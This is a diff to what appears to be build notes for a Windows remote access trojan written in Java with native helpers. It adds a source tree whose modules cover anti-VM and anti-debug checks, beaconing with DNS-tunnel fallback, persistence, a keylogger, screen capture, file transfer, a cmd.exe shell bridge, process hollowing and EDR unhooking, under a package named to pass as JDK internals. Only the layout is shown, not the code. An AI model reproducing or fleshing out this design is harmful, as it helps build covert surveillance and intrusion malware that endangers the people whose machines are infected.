@@ -18,3 +18,28 @@ Native needs mingw-w64, xxd, python3.
   %ProgramFiles%\Java\jre - adjust for bundled runtimes.
 - NtUnmapViewOfSection is used undeclared; include <winternl.h> and drop the
   typedef if your SDK complains.
+
+  src/main/java/com/sun/rt/
+├── Bootstrap.java              # entry, gate, wiring
+├── core/Native.java            # JNI bridge
+├── core/Dispatcher.java        # task queue
+├── core/Transport.java         # AES-GCM + HTTPS + pinning
+├── core/Heartbeat.java         # beacon loop, backoff, DNS failover
+├── core/DnsTunnel.java         # base32 TXT fallback
+├── core/Gate.java              # anti-VM / anti-debug
+├── core/Config.java            # decrypted runtime config
+├── core/Persist.java           # 3 mechanisms
+├── mod/Keylogger.java          # buffer + chunker
+├── mod/Chunk.java              # TLV framing
+├── mod/Screen.java             # AWT Robot
+├── mod/Files.java              # browse / get / put
+├── mod/Shell.java              # cmd.exe bridge
+├── util/S.java                 # string decryption
+└── util/Log.java               # no-op in release
+src/main/native/
+├── com_sun_rt_core_Native.h    # generated
+├── keyhook.cpp
+├── hollow.cpp
+├── unhook.cpp
+├── sysinfo.cpp
+└── jvmstub.cpp                 # hollow payload
